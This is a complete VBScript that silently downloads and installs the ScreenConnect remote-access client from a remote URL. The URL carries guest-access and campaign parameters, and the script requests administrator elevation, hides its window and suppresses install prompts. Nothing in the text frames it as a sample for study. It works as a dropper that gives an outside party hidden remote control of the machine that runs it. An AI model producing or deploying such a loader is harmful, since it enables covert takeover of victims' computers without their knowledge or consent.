Dim objShell
Set objShell = CreateObject("Shell.Application")

objShell.ShellExecute _
    "msiexec.exe", _
    "/i ""https://mcs1.screenconnect.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest&c=Evento_Plus&c=&c=&c=&c=&c=&c=&c="" /quiet /norestart", _
    "", _
    "runas", _
    0